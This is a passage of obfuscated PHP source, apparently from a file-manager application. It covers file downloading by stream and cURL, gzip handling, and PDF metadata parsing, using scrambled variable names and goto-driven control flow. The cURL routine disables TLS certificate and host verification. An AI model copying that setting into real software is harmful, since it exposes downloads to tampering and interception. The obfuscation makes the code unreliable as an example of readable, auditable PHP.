$EÚËîÆÍ¨¡ . $dé¬≠ÖÉ‘ã[1471]; set_timeout(); @unlink($D±€€Õ»Òë); if ($eª¯ã°®∂á = @fopen($FÈﬂ©øÃúä, $dé¬≠ÖÉ‘ã[1476])) { goto F€µâÏôˆ≤; F€µâÏôˆ≤: if (!($b˜‚§ÃÂ¡ = @fopen($D±€€Õ»Òë, $dé¬≠ÖÉ‘ã[1477]))) { return array($dé¬≠ÖÉ‘ã[1018] => !1, $dé¬≠ÖÉ‘ã[1020] => $dé¬≠ÖÉ‘ã[1478]); } while (!feof($eª¯ã°®∂á)) { if (!file_exists($D±€€Õ»Òë)) { fclose($b˜‚§ÃÂ¡); return array($dé¬≠ÖÉ‘ã[1018] => !1, $dé¬≠ÖÉ‘ã[1020] => $dé¬≠ÖÉ‘ã[1479]); } clearstatcache(); if ($eÈ§∞πÑ©î > 0 && $eÈ§∞πÑ©î == filesize(iconv_system($D±€€Õ»Òë))) { break; } fwrite($b˜‚§ÃÂ¡, fread($eª¯ã°®∂á, 1024 * 8), 1024 * 8); } fclose($b˜‚§ÃÂ¡); goto eªÊ‘Û±≤”; eôúÃ»çÜå: self::checkGzip($D±€€Õ»Òë); if (!@rename($D±€€Õ»Òë, $EÚËîÆÍ¨¡)) { usleep(round(rand(0, 1000) * 50)); @unlink($EÚËîÆÍ¨¡); $c˘äÕ“Í “ = @rename($D±€€Õ»Òë, $EÚËîÆÍ¨¡); if (!$c˘äÕ“Í “) { return array($dé¬≠ÖÉ‘ã[1018] => !1, $dé¬≠ÖÉ‘ã[1020] => $dé¬≠ÖÉ‘ã[1481]); } } return array($dé¬≠ÖÉ‘ã[1018] => !0, $dé¬≠ÖÉ‘ã[1020] => $dé¬≠ÖÉ‘ã[688]); goto c∞° â±ôÙ; eªÊ‘Û±≤”: fclose($eª¯ã°®∂á); $E‹ëïÉñ”∏ = filesize(iconv_system($D±€€Õ»Òë)); if ($eÈ§∞πÑ©î != 0 && $E‹ëïÉñ”∏ != $eÈ§∞πÑ©î) { return array($dé¬≠ÖÉ‘ã[1018] => !1, $dé¬≠ÖÉ‘ã[1020] => $dé¬≠ÖÉ‘ã[1480]); } goto eôúÃ»çÜå; c∞° â±ôÙ: } else { return array($dé¬≠ÖÉ‘ã[1018] => !1, $dé¬≠ÖÉ‘ã[1020] => $dé¬≠ÖÉ‘ã[1482]); } } static function fileDownloadCurl($cÚ´Ç‡∂˘∫, $B  é”Ö∞º, $c·ÒΩÍÌòû = false, $F›π¢åë›° = 0, $c∆Æ◊ÕéœÊ = 0) { goto D≤Âòıﬁâº; cÜ©⁄µõ”›: curl_setopt($bí∏äŸ€Ùî, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($bí∏äŸ€Ùî, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($bí∏äŸ€Ùî, CURLOPT_SSL_VERIFYHOST, 0); goto c∆æùµ’‹Ú; eæñèâõÜ»: if ($fà¿÷¯íëû < $c∆Æ◊ÕéœÊ && $c∆Æ◊ÕéœÊ != 0) { return array($Fπ©ºãàÕﬂ[1018] => !1, $Fπ©ºãàÕﬂ[1020] => $Fπ©ºãàÕﬂ[1472]); } if ($fà¿÷¯íëû > $c∆Æ◊ÕéœÊ && $c∆Æ◊ÕéœÊ != 0) { return array($Fπ©ºãàÕﬂ[1018] => !1, $Fπ©ºãàÕﬂ[1020] => $Fπ©ºãàÕﬂ[1480]); } if ($c•‰’ñ€ê¨ && filesize($bôÙ≤¡ëãÍ) != 0) { self::checkGzip($bôÙ≤¡ëãÍ); if (!@rename($bôÙ≤¡ëãÍ, $B  é”Ö∞º)) { @unlink($B  é”Ö∞º); $c•‰’ñ€ê¨ = @rename($bôÙ≤¡ëãÍ, $B  é”Ö∞º); if (!$c•‰’ñ€ê¨) { return array($Fπ©ºãàÕﬂ[1018] => !1, $Fπ©ºãàÕﬂ[1020] => $Fπ©ºãàÕﬂ[1485]); } } return array($Fπ©ºãàÕﬂ[1018] => !0, $Fπ©ºãàÕﬂ[1020] => $Fπ©ºãàÕﬂ[688]); } goto còëÀî«µ‚; D≤Âòıﬁâº: $Fπ©ºãàÕﬂ =& $_SERVER[Æ¡î¢≠¯™]; $bôÙ≤¡ëãÍ = $B  é”Ö∞º . $Fπ©ºãàÕﬂ[1471]; set_timeout(); goto BØ€•ÇÇÎª; C¨ã∫Ò’•: curl_close($bí∏äŸ€Ùî); fclose($CÃ≤Ûæêâ∂); $fà¿÷¯íëû = filesize(iconv_system($bôÙ≤¡ëãÍ)); goto eæñèâõÜ»; bØ≠“ﬂŒìÈ: if ($c·ÒΩÍÌòû) { curl_setopt($bí∏äŸ€Ùî, CURLOPT_RANGE, $F›π¢åë›° . $Fπ©ºãàÕﬂ[706]); } curl_setopt($bí∏äŸ€Ùî, CURLOPT_FILE, $CÃ≤Ûæêâ∂); curl_setopt($bí∏äŸ€Ùî, CURLOPT_REFERER, get_url_link($cÚ´Ç‡∂˘∫)); goto cÜ©⁄µõ”›; còëÀî«µ‚: return array($Fπ©ºãàÕﬂ[1018] => !1, $Fπ©ºãàÕﬂ[1020] => $Fπ©ºãàÕﬂ[1486]); goto d›éˆ™á”ã; E∫»åÑçπ: curl_setopt($bí∏äŸ€Ùî, CURLOPT_USERAGENT, $Fπ©ºãàÕﬂ[1475]); $c•‰’ñ€ê¨ = curl_exec($bí∏äŸ€Ùî); curl_progress_end($bí∏äŸ€Ùî); goto C¨ã∫Ò’•; c∆æùµ’‹Ú: curl_setopt($bí∏äŸ€Ùî, CURLOPT_NOPROGRESS, !1); curl_setopt($bí∏äŸ€Ùî, CURLOPT_PROGRESSFUNCTION, $Fπ©ºãàÕﬂ[1484]); curl_progress_start($bí∏äŸ€Ùî); goto E∫»åÑçπ; BØ€•ÇÇÎª: $CÃ≤Ûæêâ∂ = @fopen($bôÙ≤¡ëãÍ, $Fπ©ºãàÕﬂ[968]); if (!$CÃ≤Ûæêâ∂) { return array($Fπ©ºãàÕﬂ[1018] => !1, $Fπ©ºãàÕﬂ[1020] => $Fπ©ºãàÕﬂ[1483]); } $bí∏äŸ€Ùî = curl_init($cÚ´Ç‡∂˘∫); goto bØ≠“ﬂŒìÈ; d›éˆ™á”ã: } static function checkGzip($aÓ’∑”Æ˜Õ) { goto bÔıôé ®»; F›…¯ıâà: ob_start(); readgzfile($aÓ’∑”Æ˜Õ); $A±¨›çˆÜ£ = ob_get_clean(); goto EéÚÜ©Æ€ï; EéÚÜ©Æ€ï: file_put_contents($aÓ’∑”Æ˜Õ, $A±¨›çˆÜ£); goto Bæõ–üöçë; bÔıôé ®»: $Cø„◊∂û„è = $_SERVER[Æ¡î¢≠¯™][1487]; $c°‚ú◊ù„è = file_sub_str($aÓ’∑”Æ˜Õ, 0, 2); if ($Cø„◊∂û„è != $c°‚ú◊ù„è) { return; } goto F›…¯ıâà; Bæõ–üöçë: } } class FileParsePdf { public static function parse($eÿ√çÑø∞ª) { goto Eå€§Ü¯Õ÷; Aß≈†üÙã≠: $Fÿ¢¥Ωìèí = $a‡◊¿ÛÁìÇ[1493]; preg_match($Fÿ¢¥Ωìèí, $bé¨éâÜûÆ[$a‡◊¿ÛÁìÇ[1489]], $EÑ™íÚáÛ√); if (!$BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1492]] && count($EÑ™íÚáÛ√) == 5) { $BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1492]] = $EÑ™íÚáÛ√[3]; $BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1494]] = $EÑ™íÚáÛ√[4]; } goto FÃ≥óÜ°Ÿ; AÖÊ£ÎÌ¶ø: $bé¨éâÜûÆ[$a‡◊¿ÛÁìÇ[1489]] = StreamWrapperIO::read($eÿ√çÑø∞ª, 0, $F¿ê ùàÊ≠); $bé¨éâÜûÆ[$a‡◊¿ÛÁìÇ[1490]] = StreamWrapperIO::read($eÿ√çÑø∞ª, $bé¨éâÜûÆ[$a‡◊¿ÛÁìÇ[87]] - $F¿ê ùàÊ≠, $F¿ê ùàÊ≠); $dï∂ÙÊèπŸ = self::decodeXref($bé¨éâÜûÆ); goto EÊƒΩÌÏÉÑ; aìƒãÆÎøŒ: if ($EÑ™íÚáÛ√[1] && $BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1496]] < $EÑ™íÚáÛ√[1][0]) { $BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1496]] = $EÑ™íÚáÛ√[1][0]; } $BâÍ≈ÊÎú“ = self::parseInfoItem($BâÍ≈ÊÎú“); return $BâÍ≈ÊÎú“; goto dûúÂôÎßÉ; Eå€§Ü¯Õ÷: $a‡◊¿ÛÁìÇ =& $_SERVER[Æ¡î¢≠¯™]; $F¿ê ùàÊ≠ = 32 * 1024; $bé¨éâÜûÆ = array($a‡◊¿ÛÁìÇ[767] => fopen($eÿ√çÑø∞ª, $a‡◊¿ÛÁìÇ[1148]), $a‡◊¿ÛÁìÇ[85] => $eÿ√çÑø∞ª, $a‡◊¿ÛÁìÇ[87] => filesize($eÿ√çÑø∞ª), $a‡◊¿ÛÁìÇ[1488] => $F¿ê ùàÊ≠); goto AÖÊ£ÎÌ¶ø; E∞◊âƒäÂ’: preg_match_all($Fÿ¢¥Ωìèí, $bé¨éâÜûÆ[$a‡◊¿ÛÁìÇ[1489]], $EÑ™íÚáÛ√); if ($EÑ™íÚáÛ√[1] && $BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1496]] < $EÑ™íÚáÛ√[1][0]) { $BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1496]] = $EÑ™íÚáÛ√[1][0]; } preg_match_all($Fÿ¢¥Ωìèí, $bé¨éâÜûÆ[$a‡◊¿ÛÁìÇ[1490]], $EÑ™íÚáÛ√); goto aìƒãÆÎøŒ; EÊƒΩÌÏÉÑ: if ($dï∂ÙÊèπŸ) { $cŸ‚¢Ûû™é = $dï∂ÙÊèπŸ[$a‡◊¿ÛÁìÇ[1491]][$a‡◊¿ÛÁìÇ[1170]]; $BâÍ≈ÊÎú“ = self::getObjectValue($bé¨éâÜûÆ, $dï∂ÙÊèπŸ, $cŸ‚¢Ûû™é); } $BâÍ≈ÊÎú“ = is_array($BâÍ≈ÊÎú“) ? $BâÍ≈ÊÎú“ : array(); $BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1492]] = 0; goto Aß≈†üÙã≠; FÃ≥óÜ°Ÿ: preg_match($Fÿ¢¥Ωìèí, $bé¨éâÜûÆ[$a‡◊¿ÛÁìÇ[1490]], $EÑ™íÚáÛ√); if (!$BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1492]] && count($EÑ™íÚáÛ√) == 5) { $BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1492]] = $EÑ™íÚáÛ√[3]; $BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1494]] = $EÑ™íÚáÛ√[4]; } preg_match($a‡◊¿ÛÁìÇ[1495], $bé¨éâÜûÆ[$a‡◊¿ÛÁìÇ[1489]], $EÑ™íÚáÛ√); goto Dıèæﬂ∏Êõ; Dıèæﬂ∏Êõ: if ($EÑ™íÚáÛ√) { $BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1304]] = $EÑ™íÚáÛ√[1]; } $BâÍ≈ÊÎú“[$a‡◊¿ÛÁìÇ[1496]] = 0; $Fÿ¢¥Ωìèí = $a‡◊¿ÛÁìÇ[1497]; goto E∞◊âƒäÂ’; dûúÂôÎßÉ: } private static function parseInfoItem($dÜ¥ã¶Ú‹É) { $b…äïÕáÃß =& $_SERVER[Æ¡î¢≠¯™]; if (!$dÜ¥ã¶Ú‹É) { return !1; } $dööœØ©Ìü = array($b…äïÕáÃß[1305] => array($b…äïÕáÃß[1498], $b…äïÕáÃß[33]), $b…äïÕáÃß[1499] => array($b…äïÕáÃß[1500], $b…äïÕáÃß[33]), $b…äïÕáÃß[194] => array($b…äïÕáÃß[1501], $b…äïÕáÃß[217]), $b…äïÕáÃß[117] => array($b…äïÕáÃß[1502], $b…äïÕáÃß[217]), $b…äïÕáÃß[1496] => array($b…äïÕáÃß[1496], $b…äïÕáÃß[282]), $b…äïÕáÃß[1492] => array($b…äïÕáÃß[1492], $b…äïÕáÃß[282]), $b…äïÕáÃß[1494] => array($b…äïÕáÃß[1494], $b…äïÕáÃß[282]), $b…äïÕáÃß[1503] => array($b…äïÕáÃß[1504], $b…äïÕáÃß[33]), $b…äïÕáÃß[1505] => array($b…äïÕáÃß[1506], $b…äïÕáÃß[33]), $b…äïÕáÃß[1507] => array($b…äïÕáÃß[1304], $b…äïÕáÃß[33])); $DÁ©»ﬂ∫ä∏ = array(); foreach ($dööœØ©Ìü as $dóûïØ’ı– => $Dª‡·ä¿∫) { if (!isset($dÜ¥ã¶Ú‹É[$Dª‡·ä¿∫[0]])) { continue; } $Dóâí≤¨ìç = $dÜ¥ã¶Ú‹É[$Dª‡·ä¿∫[0]]; if (!$Dóâí≤¨ìç || is_array($Dóâí≤¨ìç)) { continue; } switch ($Dª‡·ä¿∫[1]) { case $b…äïÕáÃß[282]: $Dóâí≤¨ìç = intval($Dóâí≤¨ìç); break; case $b…äïÕáÃß[217]: if (substr($Dóâí≤¨ìç, 0, 2) == $b…äïÕáÃß[1508]) { $Dóâí≤¨ìç = substr($Dóâí≤¨ìç, 2, 14); } if (strtotime($Dóâí≤¨ìç)) { $Dóâí≤¨ìç = date($b…äïÕáÃß[1509], strtotime($Dóâí≤¨ìç)); } break; } $DÁ©»ﬂ∫ä∏[$dóûïØ’ı–] = $Dóâí≤¨ìç; } return $DÁ©»ﬂ∫ä∏; } private static function decodeXref(&$fˆ≤°Ωçöò) { goto Cä„äüçøè; dô°çÃÜ–·: $bﬁâÜ±÷…ø = $eçºµûçè[1511]; if (!preg_match_all($bﬁâÜ±÷…ø, $e¬ç≥©ÃÊó, $e¥Á“≠⁄ƒˆ, PREG_SET_ORDER, 0)) { return !1; } $D¢¯àùûáê = intval($e¥Á“≠⁄ƒˆ[0][1]); goto EÁÓê∂Î≈‹; E”Ê÷”·ó◊: if (preg_match($eçºµûçè[1517], $Aä‚ßﬁÆ™„, $e¥Á“≠⁄ƒˆ) > 0) { $E⁄éÈø±ªÑ[$eçºµûçè[1491]][$eçºµûçè[87]] = intval($e¥Á“≠⁄ƒˆ[1]); } if (preg_match($eçºµûçè[1518], $Aä‚ßﬁÆ™„, $e¥Á“≠⁄ƒˆ) > 0) { $E⁄éÈø±ªÑ[$eçºµûçè[1491]][$eçºµûçè[1519]] = intval($e¥Á“≠⁄ƒˆ[1]) . $eçºµûçè[80] . intval($e¥Á“≠⁄ƒˆ[2]); } if (preg_match($eçºµûçè[1520], $Aä‚ßﬁÆ™„, $e¥Á“≠⁄ƒˆ) > 0) { $E⁄éÈø±ªÑ[$eçºµûçè[1491]][$eçºµûçè[1521]] = intval($e¥Á“≠⁄ƒˆ[1]) . $eçºµûçè[80] . intval($e¥Á“≠⁄ƒˆ[2]); } goto b¡ùåõÏ˜Ü; dæÈ»÷Ûßﬂ: foreach ($e¥Á“≠⁄ƒˆ[3] as $EÏæﬂ…ÑÊç => $d÷ “Ûô∆Ê) { if ($e¥Á“≠⁄ƒˆ[3][$EÏæﬂ…ÑÊç] == $eçºµûçè[1513]) { $EƒÓØ™ßÁä = $c÷„æ∂∞µá . $eçºµûçè[80] . intval($e¥Á“≠⁄ƒˆ[2][$EÏæﬂ…ÑÊç]); $E⁄éÈø±ªÑ[$eçºµûçè[1510]][$EƒÓØ™ßÁä] = intval($e¥Á“≠⁄ƒˆ[1][$EÏæﬂ…ÑÊç]); ++$c÷„æ∂∞µá; } else { if ($e¥Á“≠⁄ƒˆ[3][$EÏæﬂ…ÑÊç] == $eçºµûçè[1514]) { ++$c÷„æ∂∞µá; } else { } } } if (preg_match_all($eçºµûçè[1515], $e¬ç≥©ÃÊó, $e¥Á“≠⁄ƒˆ)) { $B¨Œÿ‹“ÿ· = $fˆ≤°Ωçöò[$eçºµûçè[87]] - $fˆ≤°Ωçöò[$eçºµûçè[1488]]; foreach ($e¥Á“≠⁄ƒˆ[0] as $EÏæﬂ…ÑÊç => $fá‹¿ﬂÊ∏¥) { $bŸ»Êâﬁ£á = $e¥Á“≠⁄ƒˆ[1][$EÏæﬂ…ÑÊç] . $eçºµûçè[80] . $e¥Á“≠⁄ƒˆ[2][$EÏæﬂ…ÑÊç]; $E⁄éÈø±ªÑ[$eçºµûçè[1510]][$bŸ»Êâﬁ£á] = strpos($e¬ç≥©ÃÊó, $fá‹¿ﬂÊ∏¥) + $B¨Œÿ‹“ÿ· + 1; } } if (preg_match_all($eçºµûçè[1516], $e¬ç≥©ÃÊó, $e¥Á“≠⁄ƒˆ)) { $Aä‚ßﬁÆ™„ = count($e¥Á“≠⁄ƒˆ[1]) == 1 ? $e¥Á“≠⁄ƒˆ[1][0] : $e¥Á“≠⁄ƒˆ[1][1]; } else { $Aä‚ßﬁÆ™„ = substr($e¬ç≥©ÃÊó, -1024 * 5); } goto E”Ê÷”·ó◊; b¡ùåõÏ˜Ü: if (preg_match($eçºµûçè[1522], $Aä‚ßﬁÆ™„, $e¥Á“≠⁄ƒˆ) > 0) { $E⁄éÈø±ªÑ[$eçºµûçè[1491]][$eçºµûçè[1170]] = intval($e¥Á“≠⁄ƒˆ[1]) . $eçºµûçè[80] . intval($e¥Á“≠⁄ƒˆ[2]); } if (preg_match($eçºµûçè[1523], $Aä‚ßﬁÆ™„, $e¥Á“≠⁄ƒˆ) > 0) { $E⁄éÈø±ªÑ[$eçºµûçè[1491]][$eçºµûçè[372]] = array(); $E⁄éÈø±ªÑ[$eçºµûçè[1491]][$eçºµûçè[372]][0] = $e¥Á“≠⁄ƒˆ[1]; $E⁄éÈø±ªÑ[$eçºµûçè[1491]][$eçºµûçè[372]][1] = $e¥Á“≠⁄ƒˆ[2]; } if (!$E⁄éÈø±ªÑ[$eçºµûçè[1491]][$eçºµûçè[1170]]) { return !1; } goto F¶·„‹ßÀ; Cä„äüçøè: $eçºµûçè =& $_SERVER[Æ¡î¢≠¯™]; $e¬ç≥©ÃÊó = $fˆ≤°Ωçöò[$eçºµûçè[1490]]; $E⁄éÈø±ªÑ = array($eçºµûçè[1491] => array(), $eçºµûçè[1510] => array()); goto dô°çÃÜ–·; F¶·„‹ßÀ: if (preg_match($eçºµûçè[1524], $Aä‚ßﬁÆ™„, $e¥Á“≠⁄ƒˆ) > 0) { } return $E⁄éÈø±ªÑ; goto a…–§Ë√›∆; EÁÓê∂Î≈‹: if ($fˆ≤°Ωçöò[$eçºµûçè[87]] - $D¢¯àùûáê > $fˆ≤°Ωçöò[$eçºµûçè[1488]]) { $B’ñ†°ëÆÁ = 4 * $fˆ≤°Ωçöò[$eçºµûçè[1488]]; $fˆ≤°Ωçöò[$eçºµûçè[1488]] = $B’ñ†°ëÆÁ; $fˆ≤°Ωçöò[$eçºµûçè[1489]] = StreamWrapperIO::read($fˆ≤°Ωçöò[$eçºµûçè[85]], 0, $B’ñ†°ëÆÁ); $fˆ≤°Ωçöò[$eçºµûçè[1490]] = StreamWrapperIO::read($fˆ≤°Ωçöò[$eçºµûçè[85]], $fˆ≤°Ωçöò[$eçºµûçè[87]] - $B’ñ†°ëÆÁ, $B’ñ†°ëÆÁ); $e¬ç≥©ÃÊó = $fˆ≤°Ωçöò[$eçºµûçè[1490]]; } $c÷„æ∂∞µá = 0; preg_match_all($eçºµûçè[1512], $e¬ç≥©ÃÊó, $e¥Á“≠⁄ƒˆ); goto dæÈ»÷Ûßﬂ; a…–§Ë√›∆: } private static function getObjectValue($E’–µªº˜á, $C≠°éº‰Ø√, $dÏÒåè›‰º) { goto D¥Ñë⁄Ñ–ß; BØ»ˆÉ±∏Ÿ: if (!is_array($D∆∏◊∫û®å[1])) { return array(); } $A’ã»Ñ·åñ = array(); for ($D¡¥ì„çÔ∞ = 0; $D¡¥ì„çÔ∞ < count($D∆∏◊∫û®å[1]); $D¡¥ì„çÔ∞ += 2) { $dòÇÖ√‰©ñ = $D∆∏◊∫û®å[1][$D¡¥ì„çÔ∞]; $dëÂâ˜ÂüÉ = $D∆∏◊∫û®å[1][$D¡¥ì„çÔ∞ + 1]; if (count($dòÇÖ√‰©ñ) == 3 && $dòÇÖ√‰©ñ[0] == $CÆ †Á∞€œ[8]) { $D∞É·Ò∫Úâ = !1; if ($dëÂâ˜ÂüÉ[0] == $CÆ †Á∞€œ[1525]) { $dëÂâ˜ÂüÉ = self::getObject($E’–µªº˜á, $C≠°éº‰Ø√[$CÆ †Á∞€œ[1510]][$dëÂâ˜ÂüÉ[1]]); } $D∞É·Ò∫Úâ = $dëÂâ˜ÂüÉ[1]; if ($D∞É·Ò∫Úâ === !1) { continue; } if (is_string($D∞É·Ò∫Úâ)) { $D∞É·Ò∫Úâ = self::decodeStr($D∞É·Ò∫Úâ); } $A’ã»Ñ·åñ[$dòÇÖ√‰©ñ[1]] = $D∞É·Ò∫Úâ; } } goto EªäÇÛõÙ˜; EªäÇÛõÙ˜: return $A’ã»Ñ·åñ; goto cùı™Éµéÿ; D¥Ñë⁄Ñ–ß: $CÆ †Á∞€œ =& $_SERVER[Æ¡î¢≠¯™]; $D∆∏◊∫û®å = self::getObject($E’–µªº˜á, $C≠°éº‰Ø√[$CÆ †Á∞€œ[1510]][$dÏÒåè›‰º]); if (is_string($D∆∏◊∫û®å[1])) { return $D∆∏◊∫û®å[1]; } goto BØ»ˆÉ±∏Ÿ; cùı™Éµéÿ: } private static function getObject($A§±í¡ª»◊, $Eóã±å¬ÂŒ) { $bôÆà∫Ç˘‘ = self::getObjectItem($A§±í¡ª»◊, $Eóã±å¬ÂŒ); $bôÆà∫Ç˘‘ = self::getObjectItem($A§±í¡ª»◊, $bôÆà∫Ç˘‘[2]); return $bôÆà∫Ç˘‘; } private static function getObjectItem($AƒÈÂ÷±ØŒ, $C∑¢∑◊‘ﬁØ) { goto A‹ûÎΩº©û; d√∞ÏÆÕüÁ: $AÀ¿õ¢ùëí = $C∑¢∑◊‘ﬁØ >= $cœµÉÙƒÜÊ ? $C∑¢∑◊‘ﬁØ - $cœµÉÙƒÜÊ : $C∑¢∑◊‘ﬁØ; $AÑ™–≈ÑúÓ = $C∑¢∑◊‘ﬁØ >= $cœµÉÙƒÜÊ ? $AƒÈÂ÷±ØŒ[$EìïËŸ∞àÏ[1490]] : $AƒÈÂ÷±ØŒ[$EìïËŸ∞àÏ[1489]]; if ($C∑¢∑◊‘ﬁØ > $EºãÙçÛ¯§ && $C∑¢∑◊‘ﬁØ <= $cœµÉÙƒÜÊ) { $AÀ¿õ¢ùëí = 0; $AÑ™–≈ÑúÓ = StreamWrapperIO::read($AƒÈÂ÷±ØŒ[$EìïËŸ∞àÏ[85]], $C∑¢∑◊‘ﬁØ, $EºãÙçÛ¯§); } goto a´ç‹Ø°ƒÛ; a´ç‹Ø°ƒÛ: $F∏úÎ√•ªâ = self::getRawObject($AÑ™–≈ÑúÓ, $AÀ¿õ¢ùëí); if ($C∑¢∑◊‘ﬁØ >= $cœµÉÙƒÜÊ) { $F∏úÎ√•ªâ[2] = $F∏úÎ√•ªâ[2] + $cœµÉÙƒÜÊ; } else { if ($C∑¢∑◊‘ﬁØ > $EºãÙçÛ¯§ && $C∑¢∑◊‘ﬁØ <= $cœµÉÙƒÜÊ) { $F∏úÎ√•ªâ[2] = $F∏úÎ√•ªâ[2] + $C∑¢∑◊‘ﬁØ; } } return $F∏úÎ√•ªâ; goto F…†áœÓ¢’; A‹ûÎΩº©û: $EìïËŸ∞àÏ =& $_SERVER[Æ¡î¢≠¯™]; $EºãÙçÛ¯§ = $AƒÈÂ÷±ØŒ[$EìïËŸ∞àÏ[1488]]; $cœµÉÙƒÜÊ = $AƒÈÂ÷±ØŒ[$EìïËŸ∞àÏ[87]] - $EºãÙçÛ¯§; goto d√∞ÏÆÕüÁ; F…†áœÓ¢’: } private static function decodeStr($aÏ‚Õßı‚ß) { goto CÈæâ“¥£‘; D¬É£∫ò⁄ÿ: $aÏ‚Õßı‚ß = $bÃ†Â˜ã•ë[33]; foreach ($eÆäÖ‰Ú∏ò as $DÑ¨≤∞ä≥≈) { if (preg_match($bÃ†Â˜ã•ë[1540], $DÑ¨≤∞ä≥≈) && !1 === stripos($DÑ¨≤∞ä≥≈, $bÃ†Â˜ã•ë[1541])) { $DÑ¨≤∞ä≥≈ = preg_replace($bÃ†Â˜ã•ë[1542], $bÃ†Â˜ã•ë[33], $DÑ¨≤∞ä≥≈); $DÑ¨≤∞ä≥≈ = trim($DÑ¨≤∞ä≥≈, $bÃ†Â˜ã•ë[914]); $DÑ¨≤∞ä≥≈ = pack($bÃ†Â˜ã•ë[1543], $DÑ¨≤∞ä≥≈); $aÏ‚Õßı‚ß .= $DÑ¨≤∞ä≥≈; } else { $aÏ‚Õßı‚ß .= $DÑ¨≤∞ä≥≈; } } if (preg_match($bÃ†Â˜ã•ë[1544], $aÏ‚Õßı‚ß)) { $Fª⁄◊ÿ’Ωâ = substr($aÏ‚Õßı‚ß, 2); $aÏ‚Õßı‚ß = $bÃ†Â˜ã•ë[33]; $B¡–…˜éòÔ = strlen($Fª⁄◊ÿ’Ωâ); for ($dƒº¶éºÜ˜ = 0; $dƒº¶éºÜ˜ < $B¡–…˜éòÔ; $dƒº¶éºÜ˜ += 2) { $Dπ∏¯£íâÔ = hexdec(bin2hex(substr($Fª⁄◊ÿ’Ωâ, $dƒº¶éºÜ˜, 2))); $aÏ‚Õßı‚ß .= mb_convert_encoding($bÃ†Â˜ã•ë[1545] . intval($Dπ∏¯£íâÔ) . $bÃ†Â˜ã•ë[77], $bÃ†Â˜ã•ë[1546], $bÃ†Â˜ã•ë[1547]); } } goto dôŒÊ¬µ¿¥; C∏—∞π¬©€: $aÏ‚Õßı‚ß = $bÃ†Â˜ã•ë[33]; foreach ($eÆäÖ‰Ú∏ò as $DÑ¨≤∞ä≥≈) { if (preg_match($bÃ†Â˜ã•ë[1537], $DÑ¨≤∞ä≥≈)) { $aÏ‚Õßı‚ß .= \chr(hexdec(trim($DÑ¨≤∞ä≥≈, $bÃ†Â˜ã•ë[1538]))); } else { $aÏ‚Õßı‚ß .= $DÑ¨≤∞ä≥≈; } } $eÆäÖ‰Ú∏ò = preg_split($bÃ†Â˜ã•ë[1539], $aÏ‚Õßı‚ß, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto D¬É£∫ò⁄ÿ; CÈæâ“¥£‘: $bÃ†Â˜ã•ë =& $_SERVER[Æ¡î¢≠¯™]; $aÏ‚Õßı‚ß = str_replace(array($bÃ†Â˜ã•ë[1526], $bÃ†Â˜ã•ë[1527], $bÃ†Â˜ã•ë[1528], $bÃ†Â˜ã•ë[1529], $bÃ†Â˜ã•ë[1530], $bÃ†Â˜ã•ë[1531], $bÃ†Â˜ã•ë[1532], $bÃ†Â˜ã•ë[1533]), array($bÃ†Â˜ã•ë[105], $bÃ†Â˜ã•ë[50], $bÃ†Â˜ã•ë[8], $bÃ†Â˜ã•ë[254], $bÃ†Â˜ã•ë[804], $bÃ†Â˜ã•ë[62], $bÃ†Â˜ã•ë[978], $bÃ†Â˜ã•ë[336]), $aÏ‚Õßı‚ß); $eÆäÖ‰Ú∏ò = preg_split($bÃ†Â˜ã•ë[1534], $aÏ‚Õßı‚ß, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto F•Íπáù–¶; F•Íπáù–¶: $aÏ‚Õßı‚ß = $bÃ†Â˜ã•ë[33]; foreach ($eÆäÖ‰Ú∏ò as $DÑ¨≤∞ä≥≈) { if (preg_match($bÃ†Â˜ã•ë[1535], $DÑ¨≤∞ä≥≈)) { $aÏ‚Õßı‚ß .= \chr(octdec(trim($DÑ¨≤∞ä≥≈, $bÃ†Â˜ã•ë[105]))); } else { $aÏ‚Õßı‚ß .= $DÑ¨≤∞ä≥≈; } } $eÆäÖ‰Ú∏ò = preg_split($bÃ†Â˜ã•ë[1536], $aÏ‚Õßı‚ß, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto C∏—∞π¬©€; dôŒÊ¬µ¿¥: return $aÏ‚Õßı‚ß; goto câó§ƒÁóá; câó§ƒÁóá: } private static function getRawObject($F È≥ï®ÌŸ, $D∏˘€»›ø‚ = 0) { goto c⁄ò±ìÉ‰û; f÷ï∂ÌÜàˆ: return array($e∏ƒÃÙìÃ¢, $F÷·Íï∫ÈÈ, $D∏˘€»›ø‚); goto C©¯“√Ü√‰; c⁄ò±ìÉ‰û: $A‹ì¡ç™”û =& $_SERVER[Æ¡î¢≠¯™]; $e∏ƒÃÙìÃ¢ = $A‹ì¡ç™”û[33]; $F÷·Íï∫ÈÈ = $A‹ì¡ç™”û[33]; goto bá«ª∆ı√≠; bá«ª∆ı√≠: $D∏˘€»›ø‚ += strspn($F È≥ï®ÌŸ, $A‹ì¡ç™”û[1548], $D∏˘€»›ø‚); $fÈõπ¢ª¢î = $F È≥ï®ÌŸ[$D∏˘€»›ø‚]; switch ($fÈõπ¢ª¢î) { case $A‹ì¡ç™”û[1549]: $bÑµ€ïΩƒµ = strcspn($F È≥ï®ÌŸ, $A‹ì¡ç™”û[1550], $D∏˘€»›ø‚); if ($bÑµ€ïΩƒµ > 0) { $D∏˘€»›ø‚ += $bÑµ€ïΩƒµ; return self::getRawObject($F È≥ï®ÌŸ, $D∏˘€»›ø‚); } break; case $A‹ì¡ç™”û[8]: $e∏ƒÃÙìÃ¢ = $fÈõπ¢ª¢î; ++$D∏˘€»›ø‚; $fÍûÓë˜–ã = 